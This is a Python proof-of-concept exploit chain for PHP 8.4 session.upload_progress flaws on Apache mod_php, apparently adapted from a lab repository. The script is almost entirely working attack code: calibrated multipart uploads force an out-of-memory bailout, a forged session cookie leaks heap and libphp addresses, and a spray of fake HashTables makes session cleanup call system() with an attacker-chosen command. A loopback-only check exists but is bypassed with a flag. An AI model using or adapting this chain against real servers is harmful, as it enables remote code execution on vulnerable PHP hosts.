#!/usr/bin/env python3
"""Engine: HTTP transport, display-off OOM-in-cookie leak, fake-HashTable fire.

Primitive for PHP <= 8.4.26 session.upload_progress (CVE-2026-109618 /
CVE-2026-109619) on Apache prefork mod_php, pure display_errors=Off:

  Leak  a calibrated multipart fill drives Zend-MM real_size to memory_limit
        exactly at the session cookie's php_url_encode, so that allocation
        OOMs (zend_bailout) with PS(send_cookie)=1 and PS(id) left dangling in
        freed heap; a second request forges a zend_string with a 600 KB length
        window over the dangling PS(id), so the Set-Cookie echoes that much
        heap -> both the Zend-MM chunk base and the libphp base.
  Fire  the OOM also leaves PS(http_session_vars) dangling; a spray of 167-byte
        fake HashTables (pDestructor = zif_system) reoccupies it, and the
        session cleanup calls system(cmd).

ps_globals geometry: id @ +0x10, send_cookie @ +0x15e, http_session_vars @
+0x168. All code offsets are build-relative; heap offsets are chunk-relative.

Adapted from dinosn's stock_aslr.py (github.com/dinosn/php-cve-2026-10961x-lab-poc).

Lab use only: every request goes to a target under test on 127.0.0.1.
"""
from __future__ import annotations

import argparse
import os
import re
import socket
import ssl
import struct
import sys
import threading
import time
import urllib.parse
from collections import Counter
from dataclasses import dataclass, field
from typing import Callable, Iterable, Iterator

# ---- build constants (php:8.4.26-apache, Debian bookworm) ------------------
ZIF_SYSTEM = 0x465370
ZVAL_PTR_DTOR = 0x65EB60
HTDATA_OFFSET = 0x690D8          # fake-HashTable landing (chunk-relative, ASLR-on)
# Chunk-relative offsets hold across boots/containers of the same image.
PROFILE_TABLE_OFF = 0xB30D8      # first live 167-byte table slot of the spray
PROFILE_FILL = 4                 # single-slot bin-56 fillers (slot parity)
PROFILE_LIVE = 800               # 31-byte live fake-reference carriers
PROFILE_PADS = ",".join(["31:31"] * 6 + ["7:7"] * 66)   # producer pads
MAX_COMMAND = 14
SID = b"attacksessionid0001"
BOUNDARY_FILL = b"S" * 17
BOUNDARY_LEAK = b"B" * 10
COOKIE_WINDOW = 600_000          # both-bases window: heap cluster + libphp dtor
CHUNK_WIRE = 262_144

# ---- measured 128M layouts -------------------------------------------------
BIG_FIELDS = 250
BIG_LEN = 258_000
BIG_FIRST_EXTRA = 1_360
TAIL_FIELDS = 100
TAIL_LEN = 15_000
SMALL_TAIL = 117
SMALL_LEN = 4_000
SEED_FIELDS = 63
SEED_NAME = 103
PROBE_FIELDS = 208           # 231-byte "X" fields behind the big blocks
PROBE_LEN = 231
# leak consumer
FORGE_FIELDS = 40
FORGE_LEN = 231
FORGE_LEN_OFF = 0x78
FORGE_LEN_VALUE = 0x4000
FORGE_CARRIER = 4000
FORGE_WINDOW_OFF = 0x90
HUGE_MB = 129


Part = tuple[str, "bytes | Callable[[], Iterable[bytes]]", "str | None"]


def pad_name(prefix: str, index: int, width: int) -> str:
    """Build a fixed-width part name ('g0000xxxxx')."""
    head = f"{prefix}{index:04d}"
    return (head + "x" * width)[:width]


def repeat_block(data: bytes, count: int) -> Callable[[], Iterator[bytes]]:
    """Return a zero-copy-ish producer for `count` copies of `data`."""

    def gen() -> Iterator[bytes]:
        for _ in range(count):
            yield data

    return gen


# --------------------------------------------------------------------------
# HTTP transport
# --------------------------------------------------------------------------
class Endpoint:
    def __init__(self, url: str, timeout: float) -> None:
        parsed = urllib.parse.urlsplit(url)
        if parsed.scheme not in ("http", "https") or not parsed.hostname:
            raise ValueError("URL must be http(s) with a host")
        self.tls = parsed.scheme == "https"
        self.host = parsed.hostname
        self.port = parsed.port or (443 if self.tls else 80)
        self.path = parsed.path or "/"
        self.host_header = self.host if ":" not in self.host else f"[{self.host}]"
        if self.port != (443 if self.tls else 80):
            self.host_header += f":{self.port}"
        self.host_override: str = ""
        self.timeout = timeout

    # -- connection --------------------------------------------------------
    def _connect(self) -> socket.socket:
        last: OSError | None = None
        for _ in range(10):
            try:
                sock = socket.create_connection((self.host, self.port), self.timeout)
                if self.tls:
                    sock = ssl.create_default_context().wrap_socket(
                        sock, server_hostname=self.host)
                sock.settimeout(self.timeout)
                return sock
            except OSError as exc:
                last = exc
                time.sleep(0.3)
        assert last is not None
        raise last

    # -- multipart framing -------------------------------------------------
    @staticmethod
    def _part_frames(part: Part, boundary: bytes) -> Iterator[bytes]:
        name, data = part[0], part[1]
        filename = part[2] if len(part) > 2 else None
        head = b"--" + boundary + b"\r\n"
        disp = b'Content-Disposition: form-data; name="' + name.encode() + b'"'
        if filename is not None:
            disp += b'; filename="' + filename.encode() + b'"'
            disp += b"\r\nContent-Type: application/octet-stream"
        yield head + disp + b"\r\n\r\n"
        if callable(data):
            yield from data()
        else:
            yield data
        yield b"\r\n"

    @classmethod
    def body_stream(cls, parts: list[Part], boundary: bytes,
                    chunked: bool) -> Iterator[bytes]:
        """Yield wire blocks; with chunked=True each block is size-prefixed."""
        for part in parts:
            for block in cls._part_frames(part, boundary):
                if not block:
                    continue
                if chunked:
                    yield f"{len(block):X}\r\n".encode() + block + b"\r\n"
                else:
                    yield block
        tail = b"--" + boundary + b"--\r\n"
        if chunked:
            yield f"{len(tail):X}\r\n".encode() + tail + b"\r\n" + b"0\r\n\r\n"
        else:
            yield tail

    # -- requests ----------------------------------------------------------
    def post(self, parts: list[Part], boundary: bytes, *, chunked: bool,
             read_cap: int = 1 << 20, timeout: float | None = None,
             cookie: str | None = None,
             cookie_prefix: str = "", extra_headers: bytes = b"") -> bytes:
        size_hdr = ("Transfer-Encoding: chunked\r\n" if chunked else
                    f"Content-Length: {self._length(parts, boundary, chunked)}\r\n")
        cookie_hdr = (f"Cookie: {cookie_prefix}PHPSESSID={cookie}\r\n"
                      if cookie else "")
        head = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host_override or self.host_header}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"{size_hdr}{cookie_hdr}Connection: close\r\n"
        ).encode() + extra_headers + b"\r\n"
        sock = self._connect()
        sock.settimeout(timeout or self.timeout)
        out = bytearray()

        def drain() -> None:
            try:
                while len(out) < read_cap:
                    block = sock.recv(min(65536, read_cap - len(out)))
                    if not block:
                        break
                    out.extend(block)
            except OSError:
                pass

        reader = threading.Thread(target=drain, daemon=True)
        reader.start()
        try:
            try:
                sock.sendall(head)
                for block in self.body_stream(parts, boundary, chunked):
                    sock.sendall(block)
            except OSError:
                pass                     # OOM bails out mid-upload
            reader.join((timeout or self.timeout) + 1)
            return bytes(out)
        finally:
            sock.close()

    @staticmethod
    def _length(parts: list[Part], boundary: bytes, chunked: bool) -> int:
        if chunked:
            raise ValueError("chunked requests carry no Content-Length")
        total = len(b"--" + boundary + b"--\r\n")
        for part in parts:
            name, data = part[0], part[1]
            filename = part[2] if len(part) > 2 else None
            head = (b"--" + boundary + b"\r\n" +
                    b'Content-Disposition: form-data; name="' + name.encode() + b'"')
            if filename is not None:
                head += b'; filename="' + filename.encode() + b'"'
                head += b"\r\nContent-Type: application/octet-stream"
            total += len(head) + 4 + len(data) + 2
        return total

    def get(self, path: str, read_cap: int = 1 << 20) -> tuple[int, bytes]:
        request = (f"GET {path} HTTP/1.1\r\nHost: {self.host_header}\r\n"
                   "Connection: close\r\n\r\n").encode()
        sock = self._connect()
        out = bytearray()
        try:
            sock.sendall(request)
            try:
                while len(out) < read_cap:
                    block = sock.recv(min(65536, read_cap - len(out)))
                    if not block:
                        break
                    out.extend(block)
            except OSError:
                pass
        finally:
            sock.close()
        head, _, body = bytes(out).partition(b"\r\n\r\n")
        match = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(match.group(1)) if match else 0), body


# --------------------------------------------------------------------------
# response decoding
# --------------------------------------------------------------------------
def cookie_payload(response: bytes) -> bytes:
    match = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", response)
    return urllib.parse.unquote_to_bytes(match.group(1).decode("latin1")) if match else b""


def decode_bases(raw: bytes, dtor_offset: int) -> tuple[int, int, int]:
    """Recover (chunk_base, libphp_base, pointer_count) from one cookie."""
    if len(raw) < 1000:
        return 0, 0, 0
    heaps: Counter[int] = Counter()
    for index in range(len(raw) - 7):
        value = int.from_bytes(raw[index:index + 8], "little")
        if 0x7F0000000000 <= value < 0x800000000000:
            heaps[value & ~0x1FFFFF] += 1
    if not heaps:
        return 0, 0, 0
    heap, heap_hits = heaps.most_common(1)[0]
    modules: Counter[int] = Counter()
    for index in range(0, len(raw) - 7, 8):
        value, = struct.unpack_from("<Q", raw, index)
        if (0x7F0000000000 <= value < 0x800000000000
                and value & 0xFFF == dtor_offset & 0xFFF
                and (value & ~0x1FFFFF) != heap):
            modules[value - dtor_offset] += 1
    module, module_hits = modules.most_common(1)[0] if modules else (0, 0)
    if heap_hits < 8:
        return 0, 0, 0
    return heap, (module if module_hits >= 8 else 0), sum(heaps.values())


def parse_offsets(path: str) -> tuple[int, int]:
    """Accept 'ZIF=..' / 'DTOR=..' lines or a libphp ELF; return offsets."""
    data = open(path, "rb").read()
    if data[:4] == b"\x7fELF":
        return elf_offsets(data)
    values: dict[str, int] = {}
    for line in data.decode().splitlines():
        key, sep, value = line.partition("=")
        if sep and key.strip() in ("ZIF_SYSTEM", "ZIF_OFFSET", "DTOR_OFFSET"):
            values[key.strip()] = int(value.strip(), 0)
    zif = values.get("ZIF_SYSTEM", values.get("ZIF_OFFSET", ZIF_SYSTEM))
    dtor = values.get("DTOR_OFFSET", ZVAL_PTR_DTOR)
    return zif, dtor


def elf_offsets(data: bytes) -> tuple[int, int]:
    """zif_system / zval_ptr_dtor offsets from a libphp.so .symtab+strtab."""
    phoff, = struct.unpack_from("<Q", data, 0x20)
    shoff, = struct.unpack_from("<Q", data, 0x28)
    phentsize, phnum = struct.unpack_from("<HH", data, 0x36)
    shentsize, shnum = struct.unpack_from("<HH", data, 0x3A)
    bases = [struct.unpack_from("<Q", data, phoff + i * phentsize + 16)[0]
             for i in range(phnum) if struct.unpack_from("<I", data, phoff + i * phentsize)[0] == 1]
    wanted = {"zif_system": 0, "zval_ptr_dtor": 0}
    sections = []
    for i in range(shnum):
        off = shoff + i * shentsize
        sh_type, = struct.unpack_from("<I", data, off + 4)
        file_off, size = struct.unpack_from("<QQ", data, off + 24)
        link, = struct.unpack_from("<I", data, off + 40)
        entsize, = struct.unpack_from("<Q", data, off + 56)
        sections.append((sh_type, file_off, size, link, entsize))
    for sh_type, file_off, size, link, entsize in sections:
        if sh_type not in (2, 11) or entsize < 24 or link >= len(sections):
            continue
        str_off, str_size = sections[link][1], sections[link][2]
        for i in range(size // entsize):
            name_off, = struct.unpack_from("<I", data, file_off + i * entsize)
            value, = struct.unpack_from("<Q", data, file_off + i * entsize + 8)
            start = str_off + name_off
            end = data.find(b"\0", start, str_off + str_size)
            if name_off and end > start:
                name = data[start:end].decode("ascii", "replace")
                if name in wanted and not wanted[name]:
                    wanted[name] = value
    base = min(bases)
    if not all(wanted.values()):
        raise ValueError("libphp.so lacks zif_system / zval_ptr_dtor symtab entries")
    return wanted["zif_system"] - base, wanted["zval_ptr_dtor"] - base


# --------------------------------------------------------------------------
# stage 1: leak both bases
# --------------------------------------------------------------------------
class Leak:
    """Chunked 129 MB OOM producer + forged-window consumer -> Set-Cookie."""

    def __init__(self, endpoint: Endpoint, dtor_offset: int, verbose: bool) -> None:
        self.http = endpoint
        self.dtor = dtor_offset
        self.verbose = verbose

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, file=sys.stderr, flush=True)

    def rotate(self) -> None:
        """Crash the prefork child; the replacement inherits the same chunk base."""
        self.log("rotate: A-fill + minimal session end")
        parts: list[Part] = [(pad_name("f", i, 5), b"V" * 3000, None)
                             for i in range(1001)]
        parts += [
            ("PHPSESSID", b"\x00", None),
            ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn", None),
            ("f", b"A" * 64, "a.txt"),
            ("big", repeat_block(b"B" * (1 << 20), HUGE_MB), None),
        ]
        self.http.post(parts, BOUNDARY_FILL, chunked=True, read_cap=1 << 20,
                       timeout=max(120.0, self.http.timeout))
        time.sleep(0.3)
        self.http.post([("PHPSESSID", SID),
                        ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")],
                       b"BNDRY12345", chunked=True, timeout=20)
        time.sleep(0.5)

    def attempt(self) -> tuple[int, int, int, bytes]:
        producer: list[Part] = []
        for index in range(SEED_FIELDS):
            producer.append((pad_name("g", index, SEED_NAME), b"v" * 8, None))
        producer.append(("999997", b"W" * 60, None))
        for index in range(BIG_FIELDS):
            extra = BIG_FIRST_EXTRA if index == 0 else 0
            producer.append((str(1000 + index), b"B" * (BIG_LEN + extra), None))
        producer += [(str(100000 + i), b"X" * PROBE_LEN, None)
                     for i in range(PROBE_FIELDS)]
        producer += [(str(200000 + i), b"T" * TAIL_LEN, None)
                     for i in range(TAIL_FIELDS)]
        producer += [(str(300000 + i), b"U" * SMALL_LEN, None)
                     for i in range(SMALL_TAIL)]
        producer += [
            ("999990", b"z" * 32, None),
            ("PHPSESSID", b"\x00", None),
            ("PHP_SESSION_UPLOAD_PROGRESS", b"p" * 200, None),
            ("F" * SEED_NAME, b"A" * 64, "A" * 99 + ".txt"),
        ]
        self.http.post(producer, BOUNDARY_FILL, chunked=True)

        value = bytearray(b"V" * FORGE_LEN)
        struct.pack_into("<Q", value, FORGE_LEN_OFF, FORGE_LEN_VALUE)
        consumer: list[Part] = [(str(1000 + i), bytes(value), None)
                                for i in range(FORGE_FIELDS)]
        forged = bytearray(b"W" * FORGE_CARRIER)
        struct.pack_into("<Q", forged, 0x80, 0x4141414141414141)
        struct.pack_into("<Q", forged, 0x88, 0)
        struct.pack_into("<Q", forged, FORGE_WINDOW_OFF, COOKIE_WINDOW)
        consumer.append(("900000", bytes(forged), None))
        consumer += [(f"post{i}[0]", b"n", None) for i in range(FORGE_FIELDS)]
        consumer += [("PHPSESSID", SID),
                     ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
        response = self.http.post(consumer, BOUNDARY_LEAK, chunked=False,
                                  read_cap=2 << 20)
        raw = cookie_payload(response)
        heap, module, count = decode_bases(raw, self.dtor)
        return heap, module, count, raw

    def run(self, attempts: int) -> tuple[int, int]:
        heap = module = 0
        for attempt in range(1, attempts + 1):
            self.rotate()
            self.log(f"leak attempt {attempt}/{attempts}")
            heap, module, count, raw = self.attempt()
            self.log(f"  cookie={len(raw)}B ptrs={count} heap={heap:#x} libphp={module:#x}")
            if heap and module:
                return heap, module
            if attempt < attempts:
                self.rotate()
        return heap, module


# --------------------------------------------------------------------------
# stage 3: fake HashTable dispatch
# --------------------------------------------------------------------------
class Fire:
    """OOM producer + 167-byte fake HashTable consumer.

    PS(http_session_vars) is a zval reference left stale by the producer's
    OOM; its HashTable slot is reclaimed by the 167-byte dispatch bodies.
    The table is shaped so zend_hash_destroy takes the
    'static keys / no holes' branch and calls pDestructor = zif_system with
    &bucket->val acting as a fake zend_execute_data.
    """

    def __init__(self, endpoint: Endpoint, zif: int, dtor: int,
                 verbose: bool) -> None:
        self.http = endpoint
        self.zif = zif
        self.dtor = dtor
        self.verbose = verbose

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, file=sys.stderr, flush=True)

    def rotate(self) -> None:
        parts: list[Part] = [(pad_name("f", i, 5), b"V" * 3000, None)
                             for i in range(1001)]
        parts += [("PHPSESSID", b"\x00", None),
                  ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn", None),
                  ("f", b"A" * 64, "a.txt"),
                  ("big", repeat_block(b"B" * (1 << 20), HUGE_MB), None)]
        self.http.post(parts, BOUNDARY_FILL, chunked=True,
                       timeout=max(120.0, self.http.timeout))
        time.sleep(0.3)
        self.http.post([("PHPSESSID", SID),
                        ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")],
                       b"BNDRY12345", chunked=True, timeout=20)
        time.sleep(0.5)

    # -- dispatch body ------------------------------------------------------
    def table(self, table_address: int, system_address: int,
              command: bytes) -> bytes:
        table = bytearray(167)
        struct.pack_into("<II", table, 0x00, 1, 7)        # gc: rc=1 IS_ARRAY
        struct.pack_into("<II", table, 0x08, 0x10, 0xFFFFFFF8)  # static keys, mask -8
        struct.pack_into("<Q", table, 0x10, table_address + 0x20)  # arData
        struct.pack_into("<II", table, 0x18, 1, 1)        # nNumUsed=nNumOfElements=1
        struct.pack_into("<I", table, 0x20, 8)
        struct.pack_into("<Q", table, 0x30, system_address)  # pDestructor / retval
        struct.pack_into("<I", table, 0x4C, 1)            # fake call: num_args
        struct.pack_into("<Q", table, 0x70, table_address + 0x80)  # arg1.value
        struct.pack_into("<I", table, 0x78, 6)            # arg1.type = IS_STRING
        struct.pack_into("<II", table, 0x80, 1, 0x106)    # fake zend_string header
        struct.pack_into("<Q", table, 0x90, len(command))  # len
        table[0x98:0x98 + len(command)] = command
        return bytes(table)

    def carrier(self, table_address: int) -> bytes:
        return struct.pack("<II", 1, 0x1A) + struct.pack("<Q", table_address)[:7]

    # -- requests ----------------------------------------------------------
    def producer(self, cookie: str, pads: list[tuple[int, int]],
                 cookie_prefix: str = "", extra_headers: bytes = b"") -> None:
        parts: list[Part] = [
            ("PHPSESSID", b"a" * 19),
            ("PHP_SESSION_UPLOAD_PROGRESS", b"p" * 3),
        ]
        for index, (name_len, value_len) in enumerate(pads):
            base = f"p{index:04d}"
            name = (base + "x" * name_len)[:name_len] if name_len > 0 else base
            parts.append((name, b"V" * value_len))
        parts += [("f", b"A" * 64, "a.txt"),
                  ("big", repeat_block(b"B" * (1 << 20), HUGE_MB))]
        self.http.post(parts, BOUNDARY_FILL, chunked=True, read_cap=1 << 20,
                       timeout=max(120.0, self.http.timeout), cookie=cookie,
                       cookie_prefix=cookie_prefix, extra_headers=extra_headers)
        time.sleep(0.3)

    def live_ref(self, table_address: int, ref_type: int = 0x307,
                 length: int = 31) -> bytes:
        """A live value string whose DATA is a fake zend_reference.

        gc = {rc=1, IS_REFERENCE}; val.value = table; val.u1.type_info =
        IS_ARRAY|flags, so zval_ptr_dtor -> zend_reference_destroy ->
        i_zval_ptr_dtor(val) -> zend_array_destroy(fake table).
        """
        value = bytearray(b"R" * length)
        struct.pack_into("<II", value, 0x00, 1, 10)
        struct.pack_into("<Q", value, 0x08, table_address)
        struct.pack_into("<I", value, 0x10, ref_type)
        struct.pack_into("<I", value, 0x14, 0)
        return bytes(value)

    def consumer(self, table_address: int, system_address: int,
                 command: bytes, *, spray: int, live_n: int, live_len: int,
                 fill_n: int, carrier_mode: str, progress_late: bool,
                 decoy_n: int = 2, extra_headers: bytes = b"") -> bytes:
        table = self.table(table_address, system_address, command)
        arm: list[Part] = [
            ("PHPSESSID", SID),
            ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
        ]
        parts: list[Part] = [] if progress_late else list(arm)
        if carrier_mode == "adopted":
            parts += [(f"f{i:02d}", b"F" * 15) for i in range(decoy_n)]
            parts += [("g00", self.carrier(table_address))]
        elif carrier_mode == "live":
            ref = self.live_ref(table_address, 0x307, live_len)
            # single-slot bin-56 fillers: 5-char name (bin 32) + 31-byte value
            parts += [(f"g{i:04d}", b"z" * live_len) for i in range(fill_n)]
            parts += [(pad_name("r", i, 31), ref) for i in range(live_n)]
        parts += [(pad_name("a", i, 31), table) for i in range(spray)]
        if progress_late:
            parts += arm
        return self.http.post(parts, BOUNDARY_LEAK, chunked=True, timeout=30,
                              extra_headers=extra_headers)


    def run(self, heap: int, module: int, command: bytes, *,
            table_offset: int, cookie: str, spray: int, live_n: int,
            live_len: int, fill_n: int, carrier_mode: str,
            progress_late: bool, pads: list[tuple[int, int]],
            cookie_prefix: str = "", decoy_n: int = 2,
            extra_headers: bytes = b"", consumer_headers: bytes = b"") -> int:
        table_address = heap + table_offset if heap else module + table_offset
        system_address = module + self.zif
        self.log(f"dispatch: table={table_address:#x} system={system_address:#x} "
                 f"cmd={command!r} carrier={carrier_mode} live={live_n}x{live_len}")
        self.producer(cookie, pads, cookie_prefix, extra_headers)
        self.consumer(table_address, system_address, command, spray=spray,
                      live_n=live_n, live_len=live_len, fill_n=fill_n,
                      carrier_mode=carrier_mode, progress_late=progress_late,
                      decoy_n=decoy_n, extra_headers=consumer_headers)
        return 0


# --------------------------------------------------------------------------
def parse_headers(spec: str) -> bytes:
    if not spec:
        return b""
    return (spec + "\r\n").encode()


def apply_profile(args: argparse.Namespace) -> None:
    """Fill unset geometry knobs from the selected calibration profile."""
    if args.profile == "stock":
        profile = dict(carrier="live", live_n=PROFILE_LIVE, fill_n=PROFILE_FILL,
                       table_off=PROFILE_TABLE_OFF, progress_late=True,
                       a_pads=PROFILE_PADS, decoy_n=2)
    elif args.profile == "adopted":
        profile = dict(carrier="adopted", live_n=0, fill_n=0,
                       table_off=HTDATA_OFFSET, progress_late=False,
                       a_pads="", decoy_n=2)
    else:
        profile = dict(carrier="live", live_n=200, fill_n=0,
                       table_off=HTDATA_OFFSET, progress_late=False,
                       a_pads="", decoy_n=2)
    for name, value in profile.items():
        if getattr(args, name) is None or getattr(args, name) == "":
            setattr(args, name, value)


def parse_pads(spec: str) -> list[tuple[int, int]]:
    """'31:31,31:31,7:0' -> [(31,31),(31,31),(7,0)]; empty -> 6 default pads."""
    if not spec:
        return [(31, 31)] * 6
    pads = []
    for item in spec.split(","):
        name_len, _, value_len = item.partition(":")
        pads.append((int(name_len), int(value_len or 0)))
    return pads


def proof(endpoint: Endpoint, path: str, expect: bytes,
          proof_file: str = "") -> bool:
    if proof_file:
        try:
            with open(proof_file, "rb") as handle:
                return expect in handle.read()
        except OSError:
            return False
    status, body = endpoint.get(path)
    return status == 200 and expect in body


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", required=True, help="multipart endpoint")
    ap.add_argument("--stage", choices=("leak", "fire", "chain"), default="chain")
    ap.add_argument("--allow-lan", action="store_true",
                    help="permit non-loopback targets (lab use only)")
    ap.add_argument("--cmd", default="id>o", help="command, <=14 bytes")
    ap.add_argument("--fetch", default="/o", help="HTTP path with command output")
    ap.add_argument("--expect", default="uid=")
    ap.add_argument("--proof-file", default="",
                    help="host path of the command output (rw /out bind targets)")
    ap.add_argument("--heap", type=lambda v: int(v, 0), default=0)
    ap.add_argument("--module", type=lambda v: int(v, 0), default=0)
    ap.add_argument("--offsets", help="libphp.so or offsets file")
    ap.add_argument("--profile", choices=("stock", "adopted", "none"), default="stock",
                    help="stock = live-carrier profile; "
                         "adopted = 15-byte adopted-carrier shape")
    ap.add_argument("--table-off", type=lambda v: int(v, 0), default=None)
    ap.add_argument("--cookie", default="a" * 32, help="producer session cookie")
    ap.add_argument("--host-header", default="",
                    help="override the Host header (allocation-geometry knob)")
    ap.add_argument("--producer-cookie-prefix", default="",
                    help="extra cookie text placed before PHPSESSID=")
    ap.add_argument("--producer-header", default="",
                    help="extra producer request line, e.g. 'X-Pad: <value>'")
    ap.add_argument("--consumer-header", default="",
                    help="extra consumer request line, e.g. 'X-P: <value>'")
    ap.add_argument("--spray", type=int, default=15)
    ap.add_argument("--carrier", choices=("adopted", "live"), default=None)
    ap.add_argument("--live-n", type=int, default=None)
    ap.add_argument("--live-len", type=int, default=31)
    ap.add_argument("--progress-late", action=argparse.BooleanOptionalAction,
                    default=None,
                    help="send the session arming fields after the sprays")
    ap.add_argument("--decoy-n", type=int, default=2,
                    help="15-byte bin-40 decoy fields before the carrier")
    ap.add_argument("--fill-n", type=int, default=None,
                    help="single-slot bin-56 filler fields before the live refs")
    ap.add_argument("--a-pads", default="",
                    help="producer pads as 'namelen:vallen,...' (default 6x31:31)")
    ap.add_argument("--repeat", type=int, default=3)
    ap.add_argument("--timeout", type=float, default=90.0)
    ap.add_argument("--no-rotate", action="store_true",
                    help="skip the worker-rotation request (gdb probes)")
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args(argv)

    apply_profile(args)

    command = args.cmd.encode()
    if not command or len(command) > MAX_COMMAND or b"\0" in command:
        raise ValueError("--cmd must be 1-14 bytes without NUL")

    http = Endpoint(args.url, args.timeout)
    if args.host_header:
        http.host_override = args.host_header
    if http.host not in ("127.0.0.1", "localhost", "::1") and not args.allow_lan:
        raise ValueError("refusing non-loopback target without --allow-lan")

    zif, dtor = parse_offsets(args.offsets) if args.offsets else (ZIF_SYSTEM, ZVAL_PTR_DTOR)
    verbose = not args.quiet
    leak = Leak(http, dtor, verbose)
    fire = Fire(http, zif, dtor, verbose)

    heap, module = args.heap, args.module
    if args.stage in ("leak", "chain") and not heap:
        heap, module = leak.run(args.repeat)
        if not heap or not module:
            print(f"LEAK FAILED heap={heap:#x} module={module:#x}")
            return 1
        print(f"LEAK heap={heap:#x} libphp={module:#x}")
    if args.stage == "leak":
        return 0 if heap and module else 1
    if args.proof_file and os.path.exists(args.proof_file):
        print("proof file already present; refusing a stale verdict")
        return 1

    fired = 0
    for attempt in range(1, args.repeat + 1):
        if proof(http, args.fetch, args.expect.encode(), args.proof_file):
            print("proof already present; refusing a stale verdict")
            return 1
        fire.log(f"fire attempt {attempt}/{args.repeat}")
        if not args.no_rotate:
            fire.rotate()
        fire.run(heap, module, command, table_offset=args.table_off,
                 cookie_prefix=args.producer_cookie_prefix,
                 extra_headers=parse_headers(args.producer_header),
                 consumer_headers=parse_headers(args.consumer_header),
                 cookie=args.cookie, spray=args.spray, live_n=args.live_n,
                 live_len=args.live_len, fill_n=args.fill_n,
                 carrier_mode=args.carrier, progress_late=args.progress_late,
                 decoy_n=args.decoy_n, pads=parse_pads(args.a_pads))
        time.sleep(0.8)
        if proof(http, args.fetch, args.expect.encode(), args.proof_file):
            fired += 1
            print(f"FIRE {attempt}/{args.repeat} uid proof present")
            break
        print(f"FIRE {attempt}/{args.repeat} no proof")
    print(f"RESULT fire={fired} heap={heap:#x} libphp={module:#x}")
    return 0 if fired else 1


if __name__ == "__main__":
    sys.exit(main())
